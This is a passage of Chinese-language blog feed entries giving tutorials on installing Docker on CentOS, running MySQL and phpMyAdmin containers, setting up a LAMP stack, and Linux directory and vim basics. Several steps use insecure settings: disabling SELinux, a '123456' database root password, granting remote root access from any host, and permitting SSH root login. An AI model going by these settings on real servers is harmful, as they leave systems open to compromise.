    <content type="html"><![CDATA[<h2 id="下载docker"><a href="#下载docker" class="headerlink" title="下载docker"></a>下载docker</h2><p>在新主机上首次安装 Docker Engine-Community 之前，需要设置 Docker 仓库。之后，您可以从仓库安装和更新 Docker。</p><p>安装所需的软件包。yum-utils 提供了 yum-config-manager ，并且 device mapper 存储驱动程序需要 device-mapper-persistent-data 和 lvm2。</p><p>使用阿里云的源地址：<code>**sudo** yum-config-manager \   --add-repo \   https:**//**mirrors.aliyun.com**/**docker-ce**/**linux**/**centos**/**docker-ce.repo</code></p><p><strong>注意：</strong>由于需要更改系统的配置文件所以下列语句都需要在root用户下进行。</p><p>使用<code>yum -y docker-ce</code>安装docker，再使用<code>docker version</code>查看docker的版本。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img60a2d39b43d04aff9e2caa61ab0b37d2.png" alt="img"></p><p>在安装好docker后默认docker是关闭的。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">systemctl <span class="hljs-built_in">start</span> docker <span class="hljs-comment"> //开启docker</span><br>systemctl <span class="hljs-built_in">stop</span> docker <span class="hljs-comment"> //关闭docker</span><br>systemctl status docker <span class="hljs-comment"> //查询docker服务</span><br>systemctl restart docker <span class="hljs-comment"> //重启docker服务</span><br></code></pre></td></tr></table></figure><p>若是在centOS中已有docker但是版本是1.13.1(<code>yum -y install docker</code>)，则需要将docker卸载后再安装。</p><p>卸载当前版本docker</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livescript">yum erase docker <span class="hljs-string">\</span><br>                  docker-client <span class="hljs-string">\</span><br>                  docker-client-latest <span class="hljs-string">\</span><br>                  docker-common <span class="hljs-string">\</span><br>                  docker-latest <span class="hljs-string">\</span><br>                  docker-latest-logrotate <span class="hljs-string">\</span><br>                  docker-logrotate <span class="hljs-string">\</span><br>                  docker-selinux <span class="hljs-string">\</span><br>                  docker-engine-selinux <span class="hljs-string">\</span><br>                  docker-engine <span class="hljs-string">\</span><br>                  docker-ce<br></code></pre></td></tr></table></figure><h2 id="镜像与容器"><a href="#镜像与容器" class="headerlink" title="镜像与容器"></a>镜像与容器</h2><h3 id="查找镜像"><a href="#查找镜像" class="headerlink" title="查找镜像"></a>查找镜像</h3><p><code>docker search 镜像名</code>使用search查询所需要的镜像</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgsearch.png" alt="search"></p><p><strong>NAME:</strong> 镜像仓库源的名称</p><p><strong>DESCRIPTION:</strong> 镜像的描述</p><p><strong>OFFICIAL:</strong> 是否 docker 官方发布</p><p><strong>stars:</strong> 类似 Github 里面的 star，表示点赞、喜欢的意思。</p><p><strong>AUTOMATED:</strong> 自动构建。</p><p>同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，如 ubuntu 仓库源里，有 15.10、14.04 等多个不同的版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。</p><p>所以，我们如果要使用版本为15.10的ubuntu系统镜像来运行容器时，命令如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">runoob<span class="hljs-variable">@runoob</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>docker run -t -i <span class="hljs-symbol">ubuntu:</span><span class="hljs-number">15.10</span> /bin/bash <br>root<span class="hljs-variable">@d77ccb2e5cca</span><span class="hljs-symbol">:/</span><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>参数说明：</p><ul><li><strong>-i</strong>: 交互式操作。</li><li><strong>-t</strong>: 终端。</li><li><strong>ubuntu:15.10</strong>: 这是指用 ubuntu 15.10 版本镜像为基础来启动容器。</li><li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li></ul><p>如果要使用版本为 14.04 的 ubuntu 系统镜像来运行容器时，命令如下：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">runoob<span class="hljs-variable">@runoob</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>docker run -t -i <span class="hljs-symbol">ubuntu:</span><span class="hljs-number">14.04</span> /bin/bash <br>root<span class="hljs-variable">@39e968165990</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure><p>如果你不指定一个镜像的版本标签，例如你只使用 ubuntu，docker 将默认使用 ubuntu:latest 镜像。</p><p><code>docker images</code>查询本机的镜像。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimgimages.png" alt="images"></p><h3 id="拖取镜像"><a href="#拖取镜像" class="headerlink" title="拖取镜像"></a>拖取镜像</h3><p><code>docker pull 镜像名</code>用于下载镜像。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">runoob@runoob:~$ docker pull httpd</span><br>Using default tag: latest<br><span class="hljs-section">latest: Pulling from library/httpd</span><br><span class="hljs-section">8b87079b7a06: Pulling fs layer </span><br><span class="hljs-section">a3ed95caeb02: Download complete </span><br><span class="hljs-section">0d62ec9c6a76: Download complete </span><br><span class="hljs-section">a329d50397b9: Download complete </span><br><span class="hljs-section">ea7c1f032b5c: Waiting </span><br><span class="hljs-section">be44112b72c7: Waiting</span><br><br></code></pre></td></tr></table></figure><p>下载完后可以使用这个镜像<code>docker run 镜像名</code>。</p><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><p><code>docker rmi hello-world</code></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgdocker-rmi-image.png" alt="img"></p><h3 id="docker指令"><a href="#docker指令" class="headerlink" title="docker指令"></a>docker指令</h3><p>使用<code>docker</code>查看docker的所有指令，<code>docker stats --help</code>查看docker stats指令的具体用法。</p><h3 id="启动mysql容器"><a href="#启动mysql容器" class="headerlink" title="启动mysql容器"></a>启动mysql容器</h3><p><code>docker run -it ubuntu /bin/bash</code>启动ubuntu容器，须将ubuntu镜像下载到客户机，再创建容器 <code>docker container run --name mysql57 -v mysql57:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -p 3307:3306 -d mysql:5.7</code>。</p><p>其中的参数含义很显然，-p 虚拟机端口:容器端口，是将虚拟机与容器的端口组成映射，当需要有多个端口映射时，就重复多少次。</p><ul><li><strong>-i</strong>: 交互式操作。</li><li><strong>-t</strong>: 终端。</li><li><strong>ubuntu</strong>: ubuntu 镜像。</li><li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li></ul><p>要退出终端，直接输入 <strong>exit</strong>。</p><p><code>sudo docker inspect mysql57</code>进入mysql57可查看其设置。</p><p><code>docker ps</code>查看本机正在运行的容器。</p><p><code>mysql -h 172.17.0.2 -uroot -p123456</code>进入mysql程序中，可以执行mysql语句。退出需<code>;quit</code> 。</p><p><code>sudo docker run --name phpmyadmin --link mysql57:db -p 9998:80 -d phpmyadmin/phpmyadmin</code>启动phpmyadmin容器。</p><p>最后在浏览器中输入<code>本机IP:9980</code>就可以进入phpmyadmin创建的网页了。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%99%BB%E5%BD%95.png" alt="登录"></p><p>登录后可以进入mysql57创建的网页。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgmysql.png" alt="mysql"></p>]]></content>
    
    
    
    <tags>
      
      <tag>centOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在centOS搭建lamp</title>
    <link href="/2023/11/20/%E5%9C%A8centOS%E4%B8%AD%E6%90%AD%E5%BB%BAlamp/"/>
    <url>/2023/11/20/%E5%9C%A8centOS%E4%B8%AD%E6%90%AD%E5%BB%BAlamp/</url>
    
    <content type="html"><![CDATA[<p> 1.安装<em>centOS</em>镜像</p><p>寻找centOS系统，这里安装*<a href="https://mirrors.tuna.tsinghua.edu.cn/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-Minimal-2009.iso">CentOS-7-x86_64-Minimal-2009.iso</a>*版本</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgcentOS.png" alt="centOS"></p><p>下载号centOS镜像后新建centOS虚拟机，完成centOS的启动后进入登录页面</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imglogin.png" alt="login"></p><p>然后开始搭建lamp。</p><p>2.rm -f &#x2F;var&#x2F;run&#x2F;yum.pid     清理睡眠状态</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rm -f /var/run/yum.pid<br>firewall-cmd --permanent <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=3306/tcp<br>firewall-cmd --permanent <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=3306/udp<br>firewall-cmd --permanent <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=80/tcp<br>firewall-cmd --permanent <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=80/udp<br>firewall-cmd --reload<br>vi /etc/selinux<span class="hljs-built_in">/config </span>     #将<span class="hljs-attribute">SELINUX</span>=enforcing这一行修改为SELINUX=disabled<br>reboot<br>yum <span class="hljs-built_in">remove</span> mariadb-libs.x86_64<br>yum install httpd -y<br>systemctl <span class="hljs-built_in">enable</span> httpd<br>systemctl restart httpd<br>systemctl status httpd<br>yum -y install mariadb mariadb-server<br>systemctl <span class="hljs-built_in">enable</span> mariadb<br>systemctl start mariadb<br>mysql_secure_installation<br><br><br></code></pre></td></tr></table></figure><p>3.开放防火墙</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">firewall-cmd --permanent <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=3306/tcp<br>firewall-cmd --permanent <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=3306/udp<br>firewall-cmd --permanent <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=80/tcp<br>firewall-cmd --permanent <span class="hljs-attribute">--zone</span>=public <span class="hljs-attribute">--add-port</span>=80/udp<br>firewall-cmd --reload<br></code></pre></td></tr></table></figure><p>4.关闭selinux</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vi /etc/selinux<span class="hljs-built_in">/config </span> <br>将<span class="hljs-attribute">SELINUX</span>=enforcing这一行修改为SELINUX=disabled<br></code></pre></td></tr></table></figure><p>让后重启<em>centOS-7</em>（reboot）。</p><p>5.删除默认数据库</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">rpm -<span class="hljs-keyword">qa</span> | <span class="hljs-keyword">grep</span> mariadb 查找出默认数据库mariadb的包名。<br>yum <span class="hljs-built_in">remove</span> mariadb-libs.x86_64    删除<br></code></pre></td></tr></table></figure><p>6.开启apache服务</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis">yum install httpd -y<br><span class="hljs-params">system</span>ctl enable httpd<br><span class="hljs-params">system</span>ctl restart httpd<br><span class="hljs-params">system</span>ctl status httpd           //查看服务状态<br>此时访问成功回显apache测试页，网站根目录/<span class="hljs-keyword">var</span>/www/html<br></code></pre></td></tr></table></figure><p>7.安装mysql</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">yum -y install mariadb mariadb-<span class="hljs-keyword">server</span><br>systemctl <span class="hljs-keyword">enable</span> mariadb<br>systemctl <span class="hljs-keyword">start</span> mariadb<br>mysql_secure_installation<br></code></pre></td></tr></table></figure><p>8.mysql设置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">8.</span> Enter <span class="hljs-keyword">current</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> root (enter <span class="hljs-keyword">for</span> <span class="hljs-keyword">none</span>):&lt;–初次运行直接回车<span class="hljs-keyword">Set</span> root <span class="hljs-keyword">password</span>? [Y/n]&lt;– 是否设置root用户密码，输入y并回车或直接回车<br><span class="hljs-built_in">New</span> <span class="hljs-keyword">password</span>:&lt;– 设置root用户的密码<br>Re-enter <span class="hljs-built_in">new</span> <span class="hljs-keyword">password</span>:&lt;– 再输入一次你设置的密码<br>其他配置<br>Remove anonymous users? [Y/n]&lt;– 是否删除匿名用户，回车<br>Disallow root <span class="hljs-keyword">login</span> remotely? [Y/n]&lt;–是否禁止root远程登录,回车,<br>Remove test <span class="hljs-keyword">database</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> it? [Y/n]&lt;– 是否删除test数据库，回车<br>Reload privilege <span class="hljs-keyword">tables</span> now? [Y/n]&lt;– 是否重新加载权限表，回车<br>初始化MariaDB完成，接下来测试登录<br>mysql -uroot -p你的密码<br><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;%&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;你的密码的明文&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>;      <br>FLUSH <span class="hljs-keyword">PRIVILEGES</span>;                  远程登陆<br></code></pre></td></tr></table></figure><p>完成。</p><p>9.php安装</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs smali">  a. rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm <br>  b. yum -y remove php*<br>  c. yum -y install php72w php72w-cli php72w-fpm php72w-common php72w-devel php72w-embedded php72w-gd php72w-mbstring php72w-mysqlnd php72w-opcache php72w-pdo php72w-xml<br>  d.<span class="hljs-keyword"> system</span>ctl enable php-fpm.service <span class="hljs-keyword"></span><br><span class="hljs-keyword">system</span>ctl start php-fpm.service<br></code></pre></td></tr></table></figure><p>10.<strong>配置Apache解析php文件并自动关联</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span>. vi /etc/httpd/conf/httpd<span class="hljs-selector-class">.conf</span><br><span class="hljs-selector-tag">b</span>. 找到：DirectoryIndex index.html改为：DirectoryIndex index<span class="hljs-selector-class">.html</span> index<span class="hljs-selector-class">.htm</span> index<span class="hljs-selector-class">.php</span><br>c. 找到：AddType application/x-gzip <span class="hljs-selector-class">.gz</span> .tgz在该行下面添加：AddType application/x-httpd-php <span class="hljs-selector-class">.php</span><br>d. 重启Apache：systemctl restart httpd<br>e. 在浏览器输入服务器IP地址或者绑定的域名访问即可，html文件下是网站主目录，如果是里面有个文件夹才是主目录可以在配置文件修改主目录路径，或者在IP地址访问后面加上文件夹名字。<br></code></pre></td></tr></table></figure><p>11.建立数据库连接</p><p>将之前创建网页的文件进行压缩<code>zip WWW</code>，再将zip文件传入centOS中<code>scp -r .\WWW.zip root@centOSip地址:\var\www\html\</code>，使用<code>unzip  WWW.zip</code>解压，现在就可以输入centOS的IP地址登入index.php，但是还未连接数据库所以还没办法进行登录操作。</p><p>设置对应的参数，</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgsql%E8%BF%9E%E6%8E%A5.png" alt="sql连接"></p><p>主机必须为centOS的IP地址，密码必须为centOS的登录密码。</p><p>再将之前网页的数据库复制井新数据库就可以实现之前网页的功能了。</p><p><em>注意：</em>前后两个数据库的名字需要相同，否则须<code>vim /var/www/html/link.php</code>中更改所查询的表的名字。</p><p>12.ssh远程登录设置</p><p>（1）在centos中输入<code>systemctl enable sshd</code></p><p>（2）输入<code>systemctl start sshd</code></p><p>（3）<code>vi /etc/ssh/sshd_config</code> ,在vi中进入命令行模式输入<code>:set nu</code>（显示行号）</p><p>（4）38行去掉#,后面显示PermitRootLogin yes</p><p>（5）输入<code>systemctl restart sshd</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>centOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux文件操作和指令</title>
    <link href="/2023/11/16/Linux%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/11/16/Linux%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%92%8C%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux的简单标志"><a href="#Linux的简单标志" class="headerlink" title="Linux的简单标志"></a>Linux的简单标志</h1><p>进入kali Linux系统，点击左上角黑色的框进入命令行模式。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgkali%20Linuxpng.png" alt="kali Linuxpng"></p><p><strong>在kali命令行中第一个kali表示所使用的用户是kali。第二个kali表示所使用的系统的机器名叫kali，并且可以通过<code>vi /etc/hostname</code>更改其名字（需有root权限）。中括号中显示的是现在所执行的语句的地址。$美元符号显示其为普通用户使用权限。#井号显示为root用户使用权限。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%91%BD%E4%BB%A4%E8%A1%8C.png" alt="命令行"></p><p><code>/</code>为Linux系统的根目录</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imglinux%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%A4%B9.jpg" alt="linux系统的目录文件夹"></p><p>以下是对这些目录的解释：</p><ul><li><p><strong>&#x2F;bin</strong>：<br>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着<strong>最经常使用的命令</strong>。</p></li><li><p><strong>&#x2F;boot：</strong><br>这里存放的是<strong>启动 Linux 时使用的一些核心文件</strong>，包括一些连接文件以及镜像文件。</p></li><li><p><strong>&#x2F;dev ：</strong><br>dev 是 Device(设备) 的缩写, 该目录下存放的是<strong>Linux 的外部设备</strong>，在 Linux 中访问设备的方式和访问文件的方式是相同的。</p></li><li><p><strong>&#x2F;etc：</strong><br>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的<strong>系统管理所需要的配置文件和子目录</strong>。</p></li><li><p><strong>&#x2F;home</strong>：<br><strong>用户的主目录</strong>，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的，如上图中的 alice、bob 和 eve。</p></li><li><p><strong>&#x2F;lib</strong>：<br>lib 是 Library(库) 的缩写这个目录里存放着<strong>系统最基本的动态连接共享库，其作用类似于 Windows 里的 DLL 文件。</strong>几乎所有的应用程序都需要用到这些共享库。</p></li><li><p><strong>&#x2F;lost+found</strong>：<br><strong>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</strong></p></li><li><p><strong>&#x2F;media</strong>：<br><strong>linux 系统会自动识别一些设备，例如U盘、光驱等等，当识别后，Linux 会把识别的设备挂载到这个目录下。</strong></p></li><li><p><strong>&#x2F;mnt</strong>：<br>系统提供该目录是为了<strong>让用户临时挂载别的文件系统的</strong>，我们可以将光驱挂载在 &#x2F;mnt&#x2F; 上，然后进入该目录就可以查看光驱里的内容了。</p></li><li><p><strong>&#x2F;opt</strong>：<br>opt 是 optional(可选) 的缩写，这是<strong>给主机额外安装软件所摆放的目录</strong>。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p></li><li><p><strong>&#x2F;proc</strong>：<br>proc 是 Processes(进程) 的缩写，**&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。**<br>这个目录的内容不在硬盘上而是在内存里，我们也可以直接修改里面的某些文件，比如可以通过下面的命令来屏蔽主机的ping命令，使别人无法ping你的机器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all<br></code></pre></td></tr></table></figure></li><li><p><strong>&#x2F;root</strong>：<br><strong>该目录为系统管理员</strong>，也称作超级权限者的用户主目录。</p></li><li><p><strong>&#x2F;sbin</strong>：<br>s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是<strong>系统管理员使用的系统管理程序</strong>。</p></li><li><p><strong>&#x2F;selinux</strong>：<br> 这个目录是 Redhat&#x2F;CentOS 所特有的目录，Selinux 是一个安全机制，类似于 windows 的防火墙，但是这套机制比较复杂，这个目录就是<strong>存放selinux相关的文件的</strong>。</p></li><li><p><strong>&#x2F;srv</strong>：<br> <strong>该目录存放一些服务启动之后需要提取的数据。</strong></p></li><li><p><strong>&#x2F;sys</strong>：</p><p>这是 Linux2.6 内核的一个很大的变化。该目录下安装了 2.6 内核中新出现的一个文件系统 sysfs 。</p><p>sysfs 文件系统集成了下面3种文件系统的信息：针对进程信息的 proc 文件系统、针对设备的 devfs 文件系统以及针对伪终端的 devpts 文件系统。</p><p>该文件系统是内核设备树的一个直观反映。</p><p><strong>当一个内核对象被创建的时候，对应的文件和目录也在内核对象子系统中被创建。</strong></p></li><li><p><strong>&#x2F;tmp</strong>：<br>tmp 是 temporary(临时) 的缩写这个目录是用来<strong>存放一些临时文件的</strong>。</p></li><li><p><strong>&#x2F;usr</strong>：<br> usr 是 unix shared resources(共享资源) 的缩写，<strong>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下</strong>，类似于 windows 下的 program files 目录。</p></li><li><p><strong>&#x2F;usr&#x2F;bin：</strong><br><strong>系统用户使用的应用程序。</strong></p></li><li><p><strong>&#x2F;usr&#x2F;sbin：</strong><br><strong>超级用户使用的比较高级的管理程序和系统守护程序。</strong></p></li><li><p><strong>&#x2F;usr&#x2F;src：</strong><br><strong>内核源代码默认的放置目录。</strong></p></li><li><p><strong>&#x2F;var</strong>：<br>var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括<strong>各种日志文件</strong>。</p></li><li><p><strong>&#x2F;run</strong>：<br><strong>是一个临时文件系统，存储系统启动以来的信息</strong>。当系统重启时，这个目录下的文件应该被删掉或清除。如果你的系统上有 &#x2F;var&#x2F;run 目录，应该让它指向 run。</p></li></ul><p>在 Linux 系统中，有几个目录是比较重要的，平时需要注意不要误删除或者随意更改内部文件。</p><p><strong>&#x2F;etc</strong>： 上边也提到了，这个是系统中的配置文件，如果你更改了该目录下的某个文件可能会导致系统不能启动。</p><p><strong>&#x2F;bin, &#x2F;sbin, &#x2F;usr&#x2F;bin, &#x2F;usr&#x2F;sbin</strong>: 这是系统预设的执行文件的放置目录，比如 <strong>ls</strong> 就是在 <strong>&#x2F;bin&#x2F;ls</strong> 目录下的。</p><p>值得提出的是 <strong>&#x2F;bin</strong>、**&#x2F;usr&#x2F;bin** 是给系统用户使用的指令（除 root 外的通用用户），而&#x2F;sbin, &#x2F;usr&#x2F;sbin 则是给 root 使用的指令。</p><p><strong>&#x2F;var</strong>： 这是一个非常重要的目录，系统上跑了很多程序，那么每个程序都会有相应的日志产生，而这些日志就被记录到这个目录下，具体在 &#x2F;var&#x2F;log 目录下，另外 mail 的预设放置也是在这里。</p><p>在Linux文件系统中有两个特殊的目录，一个用户所在的工作目录，也叫当前目录，可以使用一个点 <strong>.</strong> 来表示；另一个是当前目录的上一级目录，也叫父目录，可以使用两个点 <strong>..</strong> 来表示。</p><ul><li>. ：代表当前的目录，也可以使用 .&#x2F; 来表示；</li><li>.. ：代表上一层目录，也可以 ..&#x2F; 来代表。</li></ul><p>如果一个目录或文件名以一个点 . 开始，表示这个目录或文件是一个隐藏目录或文件(如：.bashrc)。即以默认方式查找时，不显示该目录或文件。</p><hr><h1 id="vim指令"><a href="#vim指令" class="headerlink" title="vim指令"></a>vim指令</h1><h4 id="什么是vim？"><a href="#什么是vim？" class="headerlink" title="什么是vim？"></a>什么是vim？</h4><p>Vim 是从 vi 发展出来的一个文本编辑器。代码补全、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。</p><p>简单的来说， vi 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。 vim 则可以说是程序开发者的一项很好用的工具。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgvim%E9%94%AE%E7%9B%98%E5%9B%BE.gif" alt="vim键盘图"></p><h4 id="vi-vim-的使用"><a href="#vi-vim-的使用" class="headerlink" title="vi&#x2F;vim 的使用"></a>vi&#x2F;vim 的使用</h4><p>基本上 vi&#x2F;vim 共分为三种模式，<strong>命令模式（Command Mode）、输入模式（Insert Mode）和命令行模式（Command-Line Mode）</strong>。</p><p>输入<code>vim  + 文件名</code>可以进入vim</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BF%9B%E5%85%A5vim.png" alt="进入vim"></p><h5 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h5><p><strong>用户刚刚启动 vi&#x2F;vim，便进入了命令模式。</strong></p><p>此状态下敲击键盘动作会被 Vim 识别为命令，而非输入字符，比如我们此时按下 <strong>i</strong>，并不会输入一个字符，<strong>i</strong> 被当作了一个命令。</p><p>以下是普通模式常用的几个命令：</p><ul><li><strong>i</strong> – 切换到输入模式，在光标当前位置开始输入文本。</li><li><strong>x</strong> – 删除当前光标所在处的字符。</li><li><strong>:</strong> – 切换到底线命令模式，以在最底一行输入命令。</li><li><strong>a</strong> – 进入插入模式，在光标下一个位置开始输入文本。</li><li><strong>o</strong>：在当前行的下方插入一个新行，并进入插入模式。</li><li><strong>O</strong> – 在当前行的上方插入一个新行，并进入插入模式。</li><li><strong>dd</strong> – 删除当前行。</li><li><strong>d+数字+d</strong> – 删除数字行。</li><li><strong>yy</strong> – 复制当前行。</li><li><strong>y+数字+y</strong> – 复制数字行。</li><li><strong>p</strong>（小写） – 粘贴剪贴板内容到光标下方。</li><li><strong>P</strong>（大写）– 粘贴剪贴板内容到光标上方。</li><li><strong>u</strong> – 撤销上一次操作。</li><li><strong>Ctrl + r</strong> – 重做上一次撤销的操作。</li></ul><p>若想要编辑文本，只需要启动 Vim，进入了命令模式，按下 <strong>i</strong> 切换到输入模式即可。</p><p>命令模式只有一些最基本的命令，因此仍要依靠<strong>底线命令行模式</strong>输入更多命令。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%80%E8%88%AC%E6%A8%A1%E5%BC%8F.png" alt="一般模式"></p><h5 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h5><p>在命令模式下按下 <strong>i</strong> 就进入了输入模式，使用 <strong>Esc</strong> 键可以返回到普通模式。</p><p>在输入模式中，可以使用以下按键：</p><ul><li><strong>字符按键以及Shift组合</strong>，输入字符</li><li><strong>ENTER</strong>，回车键，换行</li><li><strong>BACK SPACE</strong>，退格键，删除光标前一个字符</li><li><strong>DEL</strong>，删除键，删除光标后一个字符</li><li><strong>方向键</strong>，在文本中移动光标</li><li><strong>HOME</strong>&#x2F;<strong>END</strong>，移动光标到行首&#x2F;行尾</li><li><strong>Page 